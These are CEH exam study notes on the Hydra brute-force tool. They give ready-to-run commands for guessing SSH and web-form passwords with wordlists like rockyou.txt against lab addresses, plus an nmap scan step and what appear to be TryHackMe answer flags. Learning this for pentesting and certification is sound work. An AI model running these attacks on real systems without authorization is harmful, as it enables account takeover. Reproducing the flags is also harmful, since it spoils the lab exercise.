# 🔐 Hydra – Brute Force Tool (CEH Practical Notes)

## 📌 What is Hydra?

- **Hydra** is a **fast online password cracking tool**
    
- Used to perform **brute-force attacks on login services**
    
- Automates password guessing using **wordlists**
    

👉 Used for:

- SSH, FTP, HTTP login forms, SMB, etc.
    
- Quickly testing weak credentials
    

---

## ⚡ Why Hydra is Important (Exam POV)

- Supports **50+ protocols**
    
- Extremely fast due to **multi-threading**
    
- Common in **CEH practical labs**
    
- Used in **real-world pentesting**
    

---

## 🌐 Supported Protocols (Important Ones)

- SSH
    
- FTP
    
- HTTP / HTTPS (GET & POST forms)
    
- SMB
    
- RDP
    
- SMTP, POP3, IMAP
    
- MySQL, MSSQL
    

💡 _Exam Tip:_ SSH + HTTP-POST are most commonly asked

---

## ⚠️ Password Security Insight

- Weak passwords (e.g., `admin:admin`) are easily cracked
    
- Password should:
    
    - Be **> 8 characters**
        
    - Include **special characters**
        
    - Avoid common wordlists
        

---

# ⚙️ Basic Hydra Syntax

```
hydra [OPTIONS] [TARGET] [PROTOCOL]
```

---

# 🔑 Hydra Attack on SSH

## 📌 Command

```
hydra -l <username> -P <wordlist> MACHINE_IP -t 4 ssh
```

## 📖 Explanation

- `-l` → single username
    
- `-P` → password list file
    
- `-t` → number of threads (speed control)
    
- `ssh` → protocol
    

## 💡 Example

```
hydra -l root -P passwords.txt 10.10.10.10 -t 4 ssh
```

---

# 🌍 Hydra Attack on Web Login (POST Form)

## 📌 Command

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<params>:<fail_string>" -V
```

## 📖 Parameters Breakdown

- `<path>` → login page (e.g., `/login.php`)
    
- `<params>` → form fields
    
    ```
    username=^USER^&password=^PASS^
    ```
    
- `<fail_string>` → text when login fails  
    Example: `F=incorrect`
    

---

## 💡 Example

```
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

---

## 🔌 If Port is Different

```
-s <port>
```

### Example

```
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s 8080 -V
```

---

# 🧠 Key Concepts (VERY IMPORTANT)

## 🔁 Placeholders

- `^USER^` → replaced by username
    
- `^PASS^` → replaced by passwords
    

---

## 🚨 Failure vs Success Detection

- Hydra checks **response string**
    
- If `F=incorrect` → login failed
    
- If response changes → password found
    

---

## ⚡ Threads (-t)

- More threads = faster attack
    
- But too high → may crash / block
    

---

# 🧪 Practical Workflow (Exam Strategy)

## ✅ Step 1: Identify Service

- Use Nmap
    

```
nmap -sV MACHINE_IP
```

## ✅ Step 2: Choose Attack Type

- SSH → use `ssh`
    
- Web login → use `http-post-form`
    

## ✅ Step 3: Find Form Details (for web)

- Inspect browser → Network tab
    
- Find:
    
    - Request type (POST/GET)
        
    - Parameters
        
    - Failure message
        

---

## ✅ Step 4: Run Hydra

- Use correct syntax
    
- Adjust threads if needed
    

---

## ✅ Step 5: Get Credentials

Hydra output:

```
login: admin   password: 123456
```

---

# 🏁 TryHackMe Flags (Reference)

- **Flag 1 (Web)**  
    `THM{2673a7dd116de68e85c48ec0b1f2612e}`
    
- **Flag 2 (SSH)**  
    `THM{c8eeb0468febbadea859baeb33b2541b}`
    

---

# ⚠️ Common Mistakes (Exam Killers)

❌ Wrong failure string  
❌ Incorrect form parameters  
❌ Not checking request type (GET vs POST)  
❌ Wrong port  
❌ Wrong path (`/login` vs `/`)

---

# 🚀 Pro Tips for CEH Practical

- Always try **rockyou.txt**
    
- Start with **low threads (4-8)**
    
- Use `-V` for verbose output
    
- If attack fails → recheck:
    
    - URL
        
    - parameters
        
    - failure string
        

---

# 📌 Quick Revision (Last Minute)

- Hydra = **brute force tool**
    
- SSH attack:
    

```
hydra -l user -P pass.txt IP ssh
```

- Web POST attack:
    

```
hydra -l user -P pass.txt IP http-post-form "/:user=^USER^&pass=^PASS^:F=incorrect"
```

- Key things:
    
    - Form fields
        
    - Failure message
        
    - Correct protocol
        

---
